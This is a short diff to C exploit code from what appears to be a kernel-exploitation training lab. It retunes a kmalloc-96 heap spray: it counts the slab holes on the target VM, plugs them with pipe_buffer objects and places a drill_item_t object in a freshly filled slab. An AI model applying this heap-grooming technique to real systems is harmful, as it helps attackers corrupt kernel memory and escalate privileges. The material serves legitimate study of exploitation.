@@ -44,12 +44,21 @@
 #include "drill.h"
 
 /* clang-format off */
-#define CPU_PARTIAL		120
+/*
+ * Estimate the number of free slots in the kmalloc-96 slabs.
+ * In /proc/slabinfo on the target VM we see that:
+ * 	num_objs - active_objs = 5670 - 5505 = 165
+ * Let's multiply this number by 3.
+ */
+#define KMALLOC96_HOLES_N	495
 #define OBJS_PER_SLAB		42
-#define SLABS_TO_FILL		20
-#define SPRAY_PARTIAL		CPU_PARTIAL * OBJS_PER_SLAB
-#define SPRAY_ON_TOP		SLABS_TO_FILL * OBJS_PER_SLAB
-#define PIPES_N			SPRAY_PARTIAL + SPRAY_ON_TOP
+/*
+ * How many pipes do we need:
+ * 1) KMALLOC96_HOLES_N to plug the holes in the kmalloc-96 slab cache;
+ * 2) OBJS_PER_SLAB to allocate a new active slab, where we will place drill_item_t;
+ * 3) OBJS_PER_SLAB to fill that slab completely after allocating drill_item_t.
+ */
+#define PIPES_N			(KMALLOC96_HOLES_N + OBJS_PER_SLAB * 2)
 
 #define PB_PER_SLAB_SLOT	2
 #define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT
@@ -344,7 +353,13 @@ int main(void)
 			goto end;
 		}
 
-		if (i == SPRAY_PARTIAL) {
+		/*
+		 * Let's allocate a drill_item_t object after filling the empty slots
+		 * in kmalloc-96 and creating a new slab containing pipe_buffers.
+		 * After placing the drill_item_t object in this slab, we will allocate
+		 * OBJS_PER_SLAB more pipe_buffers to fill it completely.
+		 */
+		if (i == KMALLOC96_HOLES_N + OBJS_PER_SLAB) {
 			ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
 			if (ret == EXIT_FAILURE)
 				goto end;
